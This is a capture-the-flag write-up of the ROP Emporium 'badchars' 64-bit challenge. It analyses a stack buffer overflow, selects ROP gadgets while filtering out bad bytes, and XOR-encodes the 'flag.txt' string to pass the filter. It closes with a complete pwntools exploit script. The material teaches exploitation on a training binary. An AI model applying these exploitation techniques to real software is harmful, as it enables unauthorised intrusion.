# badchars - 64 Bit
Program execution:
```
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> <input_here>
```
Run checksec: `checksec ./badchars`
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
Again, `main` call `pwnme`, which is defined in the given libbadchars.so.

Disassembling libbadchars.so shows that `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `rbp-0x40`:
```assembly
lea     rax, [rbp-0x40]
add     rax {var_28}, 0x20
mov     edx, 0x200
mov     rsi, rax {var_28}
mov     edi, 0x0
call    read

```

We also find some code that checks our input for bad characters ('x'/0x78, 'g'/0x67, 'a'/0x61, '.'/0x2E). If any of these characters are found, they will be replaced with 0xeb which will invalidate our rop chain, making it incorrect.
```c
0000095c      puts(str: "badchars are: 'x', 'g', 'a', '.'")
0000096d      printf(format: &data_ae9)
00000987      int64_t rax_2 = read(fd: 0, buf: &var_28, nbytes: 0x200)
000009f6      for (int64_t var_40 = 0; var_40 u< rax_2; var_40 = var_40 + 1)
000009dd          for (int64_t var_38_1 = 0; var_38_1 u<= 3; var_38_1 = var_38_1 + 1)
000009be              if (*(&var_28 + var_40) == *(badcharacters + var_38_1))
000009c4                  *(&var_28 + var_40) = 0xeb
```

Like in the last challenge, there is a `print_file` function which will print a file specified by the string argument (filename string address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z badchars` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006c4 0x004006c4 11  12   .rodata ascii nonexistent
```
Let's find a writeable area of memory, where we can write our "flag.txt" string.
`readelf -S badchars`:
```
There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000038  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002d0  000002d0
       00000000000000f0  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003c0  000003c0
       000000000000007e  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040043e  0000043e
       0000000000000014  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400458  00000458
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400478  00000478
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004a8  000004a8
       0000000000000030  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004d8  000004d8
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004004f0  000004f0
       0000000000000030  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400520  00000520
       0000000000000192  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004006b4  000006b4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         00000000004006c0  000006c0
       0000000000000010  0000000000000000   A       0     0     4
  [16] .eh_frame_hdr     PROGBITS         00000000004006d0  000006d0
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400718  00000718
       0000000000000120  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
  [25] .comment          PROGBITS         0000000000000000  00001038
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00001068
       0000000000000618  0000000000000018          27    46     8
  [27] .strtab           STRTAB           0000000000000000  00001680
       00000000000001f8  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001878
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

So we know we need to write "flag.txt" to .data, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation). We also bear in mind our bad bytes to filter out: ('x'/0x78, 'g'/0x67, 'a'/0x61, '.'/0x2E)
`ropper -f badchars --search 'mov [???], ???' -b 7867612E`:
```
0x0000000000400635: mov dword ptr [rbp], esp; ret;
0x0000000000400634: mov qword ptr [r13], r12; ret;
```
So we have 1 gadgets that lets us move the value in `r12` into the address specified by the value of `r13`. So now we need gadgets to pop data off the stack into `r12` and `r13`
`ropper -f badchars --search 'pop r12; pop r13;' -b 7867612E`:
```
[INFO] File: badchars
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
```
We have a gadget that will let us pop `r12` and `r13` as needed but also `r14` and `r15` which we can just load dummy data into.
Since we can only move 8 bytes at a time, we will have to do 2 moves. One for "flag.txt" and one for "\x00\x00\x00\x00\x00\x00\x00\x00" so that our string ends with a null terminator.
Each time we write 8 bytes, remember we need to offset the .data address to write to, by 8.

However we aren't done. We have to account for the fact that 'g', 'a' and '.' are bad bytes but they are required to represent the string "flag.txt". We'll need to encrypt this string in our exploit to bypass badchar checks, then we can decrypt it once it's already in memory.
An easy encryption technique is `xor`.
`ropper -f badchars --search 'xor' -b 7867612E`:
```
[INFO] File: badchars
0x0000000000400628: xor byte ptr [r15], r14b; ret;
0x0000000000400629: xor byte ptr [rdi], dh; ret;
```
Luckily for us, we have an `xor` gadget so this is actually a viable technique. Since the `xor` is done byte at a time (lowest byte of the 8-byte register, as we're deal with little endian), we'll a gadget to load target address into `r15`. To load our bitmask (for `xor`) into `r14`, we'll do that with our previous gadget that loads `r12-r15`.
`ropper -f badchars --search 'pop r15' -b 7867612E`:
```
[INFO] File: badchars
0x00000000004006a2: pop r15; ret;
```
And lastly we just need a gadget to get our `data`(string) address into `rdi` to set our arg for `print_file`.
`ropper -f badchars --search 'pop rdi' -b 7867612E`:
```
[INFO] File: badchars
0x00000000004006a3: pop rdi; ret;
```

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./badchars"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
  gdb.attach(p, '''break main''')
  sleep(5)

bad_bytes = b'xga.'
# this XOR will just capitalise essentially
bitmask = 1 << 5

data_addr = 0x0000000000601028
mov_ptr_r13_r12_addr = 0x0000000000400634     # mov qword ptr [r13], r12; ret;
pop_r12_r13_r14_r15_addr = 0x000000000040069c # pop r12; pop r13; pop r14; pop r15; ret;
xor_ptr_r15_r14_addr = 0x0000000000400628     # xor byte ptr [r15], r14b; ret;
pop_r15_addr = 0x00000000004006a2         # pop r15; ret;
pop_rdi_addr = 0x00000000004006a3         # pop rdi; ret;
p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)

for i, string in enumerate([b'flag.txt', b'\x00'*8]):
  # build our string, 8 bytes at a time

  payload += p64(pop_r12_r13_r14_r15_addr)

  # xor badchars to bypass badchars check
  # if we don't limit xor to badchars,
  # we actually exceed an 0x200 byte payload
  for c in string:
    if c in bad_bytes:
      payload += p8(c ^ bitmask)
    else:
      payload += p8(c)

  payload += p64(data_addr + i*8)
  payload += p64(bitmask)
  payload += b'AAAAAAAA'
  payload += p64(mov_ptr_r13_r12_addr)

  for j in range(8):
    if string[j] in bad_bytes:
      # in-memory data manipulation to undo xor
      payload += p64(pop_r15_addr)
      payload += p64(data_addr + i*8 + j)
      payload += p64(xor_ptr_r15_r14_addr)


# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```